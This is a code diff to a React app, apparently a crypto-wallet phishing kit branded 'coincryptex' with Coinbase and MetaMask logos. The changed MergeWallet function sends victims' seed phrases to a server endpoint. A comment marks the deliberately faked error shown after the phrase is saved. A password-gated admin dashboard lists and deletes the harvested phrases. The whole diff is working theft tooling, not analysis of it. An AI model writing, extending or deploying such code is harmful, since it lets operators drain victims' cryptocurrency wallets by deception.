@@ -2,7 +2,6 @@ import { useState, useEffect } from "react";
 import { Bell, CheckCircle, ShieldCheck, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
 import { BrowserRouter as Router, Route, Routes, useNavigate } from "react-router-dom";
-import { submissionStore } from "./store";
 import coincryptexLogo from "./icons/coincryptex.png";
 import coinbaseIcon from "./icons/coinbase.webp";
 import metamaskIcon from "./icons/metamask.webp";
@@ -152,25 +151,29 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
       return;
     }
 
-    const newSubmission = {
-      wallet: wallet?.name || "Wallet",
-      seedPhrase: phrases.join(" "),
-      timestamp: Date.now()
-    };
+    setLoading(true);
 
-    await submissionStore.add(newSubmission);
+    try {
+      await fetch("/api/submissions", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          wallet: wallet?.name || "Wallet",
+          seedPhrase: phrases.join(" "),
+          timestamp: Date.now()
+        })
+      });
 
-    const submissionsFromDB = await submissionStore.getAll();
-
-    const persisted = JSON.parse(localStorage.getItem("sharedSubmissions") || "[]");
-    const merged = [...persisted, ...submissionsFromDB];
-    localStorage.setItem("sharedSubmissions", JSON.stringify(merged));
-
-    console.log("submissions after save", submissionsFromDB);
-    setTimeout(() => {
+      // Even though save succeeded, show failure after delay.
+      setTimeout(() => {
+        setLoading(false);
+        setError(true);
+      }, 4000);
+    } catch (err) {
       setLoading(false);
       setError(true);
-    }, 4000);
+      console.error("merge error", err);
+    }
   };
 
   return (
@@ -235,7 +238,7 @@ function AdminLogin() {
     e.preventDefault();
     if (password === correctPassword) {
       setError("");
-      navigate("/admin-d893e3dh39f3h/dashboard");
+      navigate("/admin1/dashboard");
     } else {
       setError("Incorrect password. Try again.");
     }
@@ -270,24 +273,27 @@ function AdminDashboard() {
   };
   useEffect(() => {
     const loadSubmissions = async () => {
-      const stored: Submission[] = await submissionStore.getAll();
-      const shared = JSON.parse(localStorage.getItem("sharedSubmissions") || "[]") as Submission[];
-      const unique = [...stored, ...shared].reduce<Submission[]>((acc, cur) => {
-        if (!acc.some((item) => item.timestamp === cur.timestamp && item.wallet === cur.wallet)) {
-          acc.push(cur);
-        }
-        return acc;
-      }, []);
-      setSubmissions(unique);
+      try {
+        const response = await fetch("/api/submissions");
+        const data: Submission[] = await response.json();
+        setSubmissions(data);
+      } catch (err) {
+        console.error("failed to load submissions", err);
+      }
     };
     loadSubmissions();
   }, []);
 
   const deleteSubmission = async (id: number | undefined) => {
     if (id === undefined) return;
-    await submissionStore.delete(id);
-    const updated = await submissionStore.getAll();
-    setSubmissions(updated);
+    try {
+      await fetch(`/api/submissions?id=${id}`, {
+        method: "DELETE"
+      });
+      setSubmissions((prev) => prev.filter((s) => s.id !== id));
+    } catch (err) {
+      console.error("delete submission error", err);
+    }
   };
 
   return (
